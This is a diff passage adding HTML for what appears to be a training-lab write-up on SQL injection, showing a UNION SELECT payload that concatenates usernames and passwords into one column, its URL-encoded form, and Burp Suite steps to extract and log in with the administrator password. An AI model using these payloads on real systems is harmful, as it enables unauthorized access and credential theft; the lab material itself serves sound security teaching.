+    ></figure>
+<p><strong>The Mechanism</strong></p>
+<p>In previous labs, we had multiple text-compatible columns to work with, allowing we to map <code>username</code> to one column and <code>password</code> to another. However, if the original query only returns <em>one</em> column that accepts text, a <code>UNION SELECT username, password</code> will fail due to column count or data type mismatches.</p>
+<p>To extract two pieces of data through a single text column, we must combine them into one string using a SQL concatenation operator.</p>
+<p><strong>The Payload</strong> Assuming we have already tested the endpoint and found that the query returns two columns, but only the <em>second</em> column accepts text data.</p>
+<ul>
+<li>
+<p><strong>Payload:</strong> <code>' UNION SELECT NULL, username || '~' || password FROM users--</code></p>
+</li>
+<li>
+<p><strong>Resulting Query:</strong> <code>SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, username || '~' || password FROM users--'</code></p>
+</li>
+<li>
+<p><strong>Breakdown:</strong></p>
+<ul>
+<li>
+<p><code>'</code> closes the initial string literal for the category filter.</p>
+</li>
+<li>
+<p><code>UNION SELECT NULL,</code> keeps the first column neutral to match the original query&rsquo;s column count and avoid data type errors.</p>
+</li>
+<li>
+<p><code>username || '~' || password</code> commands the database to fetch the username, append a literal <code>~</code> character, and then append the password, returning it all as one single text block (e.g., <code>administrator~secret123</code>).</p>
+</li>
+<li>
+<p><code>FROM users</code> specifies the hidden table we are targeting.</p>
+</li>
+<li>
+<p><code>--</code> comments out the remainder of the original query.</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>Execution Steps</strong></p>
+<ol>
+<li>
+<p>Turn on <strong>Burp Suite Proxy Intercept</strong>.</p>
+</li>
+<li>
+<p>Click on any category on the homepage to capture the <code>GET /filter?category=Gifts</code> request.</p>
+</li>
+<li>
+<p>Send the intercepted request to <strong>Repeater (Ctrl+R)</strong>.</p>
+</li>
+<li>
+<p>Modify the <code>category</code> parameter with your concatenated payload. Remember to URL-encode the payload, paying special attention to spaces and the concatenation characters:</p>
+<ul>
+<li><em>Modified parameter:</em> <code>category=Gifts'+UNION+SELECT+NULL,username||'~'||password+FROM+users--</code>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    src="Pasted%20image%2020260421000734.png"
+    ></figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Click <strong>Send</strong>.</p>
+</li>
+<li>
+<p>Look at the Response panel and search the HTML for <code>administrator</code>. We should see the username and password rendered as a single string on the page, separated by our chosen character
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    src="Pasted%20image%2020260421000758.png"
+    ></figure>
+</p>
+</li>
+<li>
+<p>Copy the password portion of the string.</p>
+</li>
+<li>
+<p>To officially solve the lab, navigate to the <strong>&ldquo;My account&rdquo;</strong> login page in your browser. Log in using <code>administrator</code> and the extracted password.
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt=""
+    src="Pasted%20image%2020260421000847.png"
+    ></figure>
+</p>
 </li>
 </ol>
 
